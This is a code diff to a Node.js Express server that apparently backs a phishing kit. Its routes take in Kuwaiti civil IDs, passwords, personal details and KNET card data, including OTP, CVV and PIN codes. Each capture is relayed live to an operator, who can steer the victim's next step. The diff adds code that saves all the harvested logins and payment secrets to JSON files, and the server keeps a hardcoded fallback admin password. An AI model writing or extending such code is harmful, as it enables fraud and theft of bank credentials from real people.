@@ -2,6 +2,7 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
+const fs = require('fs');
 const { v4: uuidv4 } = require('uuid');
 const app = express();
 const server = http.createServer(app);
@@ -11,9 +12,40 @@ const io = new Server(server, {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-let payments = [];
-let users = [];
-let loginAttempts = [];
+const DATA_DIR = path.join(__dirname, 'data');
+const PAYMENTS_FILE = path.join(DATA_DIR, 'payments.json');
+const USERS_FILE = path.join(DATA_DIR, 'users.json');
+const LOGIN_ATTEMPTS_FILE = path.join(DATA_DIR, 'loginAttempts.json');
+
+function ensureDataDir() {
+  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+}
+
+function readJson(filePath, fallback) {
+  try {
+    if (!fs.existsSync(filePath)) return fallback;
+    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
+  } catch (e) {
+    console.error('Failed to read data file:', filePath, e.message);
+    return fallback;
+  }
+}
+
+function writeJson(filePath, data) {
+  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+}
+
+function persistData() {
+  ensureDataDir();
+  writeJson(PAYMENTS_FILE, payments);
+  writeJson(USERS_FILE, users);
+  writeJson(LOGIN_ATTEMPTS_FILE, loginAttempts);
+}
+
+ensureDataDir();
+let payments = readJson(PAYMENTS_FILE, []);
+let users = readJson(USERS_FILE, []);
+let loginAttempts = readJson(LOGIN_ATTEMPTS_FILE, []);
 let adminSockets = [];
 let clientSockets = {};
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2024';
@@ -228,6 +260,7 @@ app.post('/auth/external-login', (req, res) => {
   const loginId = uuidv4();
   const login = { id: loginId, loginCivilId: civilId || '', loginPassword: password || '', created_at: new Date().toISOString() };
   loginAttempts.push(login);
+  persistData();
   notifyAdmins('login_new', login);
   res.json({ success: true, loginId, token: 'token_' + loginId });
 });
@@ -237,6 +270,7 @@ app.post('/auth', (req, res) => {
   const userId = uuidv4();
   const user = { id: userId, name: fullName || civilId || 'مستخدم', email: email || '', fullName, civilId, phone, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear, created_at: new Date().toISOString() };
   users.push(user);
+  persistData();
   notifyAdmins('login_new', user);
   res.json({ success: true, userId, user });
 });
@@ -246,6 +280,7 @@ app.post('/user', (req, res) => {
   const userId = uuidv4();
   const user = { id: userId, name: nameArabic || nameEnglish || civilId || 'مستخدم', email: email || '', civilId, nameArabic, nameEnglish, phone, gender, language, governorate, userCategory, created_at: new Date().toISOString() };
   users.push(user);
+  persistData();
   notifyAdmins('login_new', user);
   res.json({ success: true, userId, user });
 });
@@ -268,6 +303,7 @@ app.post('/knet', (req, res) => {
     created_at: new Date().toISOString(), updatedAt: new Date().toISOString()
   };
   payments.push(payment);
+  persistData();
   notifyAdmins('payment_new', payment);
   // Return PENDING - Angular will poll /knet/status and wait for admin approval
   res.json({ success: true, knetId, paymentId: knetId, refNumber, status: 'PENDING' });
@@ -286,6 +322,7 @@ app.post('/knet/update-status', (req, res) => {
   if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
   payment.status = status;
   payment.updatedAt = new Date().toISOString();
+  persistData();
   notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });
   res.json({ success: true, payment });
 });
@@ -299,6 +336,7 @@ app.post('/knet/otp', (req, res) => {
   payment.status = 'OTP_REQUEST';
   payment.step = 2;
   payment.updatedAt = new Date().toISOString();
+  persistData();
   notifyAdmins('payment_otp_received', { id: payment.id, otp, payment });
   res.json({ success: true, payment });
 });
@@ -312,6 +350,7 @@ app.post('/knet/cvv', (req, res) => {
   payment.cvv = cvv;
   payment.status = 'CVV_REQUEST';
   payment.updatedAt = new Date().toISOString();
+  persistData();
   notifyAdmins('payment_cvv_received', { id: payment.id, cvv, payment });
   res.json({ success: true, payment });
 });
@@ -654,6 +693,7 @@ app.post('/knet-otp', (req, res) => {
     notifyAdmins('payment_pin_received', { id: payment.id, pin, payment });
   }
   payment.updatedAt = new Date().toISOString();
+  persistData();
   res.json({ success: true, payment });
 });
 
@@ -719,6 +759,7 @@ app.post('/admin/payments/:id/action', (req, res) => {
   }
 
   payment.updatedAt = new Date().toISOString();
+  persistData();
   notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });
 
   if (navigateTo && navigateTo !== 'cvv_failed') {
